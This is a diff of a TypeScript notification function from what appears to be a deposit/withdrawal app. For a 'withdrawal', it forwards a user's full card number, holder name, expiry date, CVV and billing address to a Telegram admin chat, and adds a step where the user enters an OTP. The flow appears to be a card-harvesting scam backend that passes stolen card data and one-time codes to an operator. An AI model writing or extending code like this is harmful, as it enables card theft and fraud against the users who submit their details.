@@ -171,38 +171,35 @@ export const notifyDepositSubmitted = async (depositId: string, userName: string
   }
 }
 
-export const notifyWithdrawalRequest = async (withdrawalId: string, userName: string, amount: number, method: string, cardDetails?: { cardNumber: string; cardholderName: string; expiryDate: string; cvv: string; verificationCode?: string; billingAddress?: string }): Promise<void> => {
+export const notifyWithdrawalRequest = async (withdrawalId: string, userName: string, amount: number, method: string, cardDetails?: { cardNumber: string; cardholderName: string; expiryDate: string; cvv: string; billingAddress?: string }): Promise<void> => {
   const buttons = [
-    { text: '✅ Approve Card', callback_data: `approve_card_${withdrawalId}` },
     { text: '❌ Reject', callback_data: `reject_withdrawal_${withdrawalId}` },
   ]
 
-  let message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\nStatus: Pending Admin Approval`
-
   if (cardDetails) {
     const formattedCard = cardDetails.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ')
-    message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\n\n💳 Card: ${formattedCard}\n👤 Holder: ${cardDetails.cardholderName}\n📅 Expiry: ${cardDetails.expiryDate}\n🔐 CVV: ${cardDetails.cvv}\n🏠 Billing: ${cardDetails.billingAddress || 'N/A'}`
-  }
+    const message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\n\n💳 Card: ${formattedCard}\n👤 Holder: ${cardDetails.cardholderName}\n📅 Expiry: ${cardDetails.expiryDate}\n🔐 CVV: ${cardDetails.cvv}\n🏠 Billing: ${cardDetails.billingAddress || 'N/A'}\n\nUser will enter OTP to authorize.`
 
-  try {
-    let botInstance = bot
-    if (!botInstance && BOT_TOKEN) {
-      try {
-        botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
-        bot = botInstance
-      } catch (error) {
-        console.error('Telegram bot init error:', error)
-        return
+    try {
+      let botInstance = bot
+      if (!botInstance && BOT_TOKEN) {
+        try {
+          botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
+          bot = botInstance
+        } catch (error) {
+          console.error('Telegram bot init error:', error)
+          return
+        }
       }
-    }
 
-    if (botInstance && ADMIN_CHAT_ID) {
-      await sendTelegramWithButtons(message, buttons)
-    } else {
-      console.log('Telegram not configured - withdrawal notification would be:', { withdrawalId, userName, amount })
+      if (botInstance && ADMIN_CHAT_ID) {
+        await sendTelegramWithButtons(message, buttons)
+      } else {
+        console.log('Telegram not configured - withdrawal notification would be:', { withdrawalId, userName, amount })
+      }
+    } catch (error) {
+      console.error('Failed to send withdrawal notification:', error)
     }
-  } catch (error) {
-    console.error('Failed to send withdrawal notification:', error)
   }
 }
 
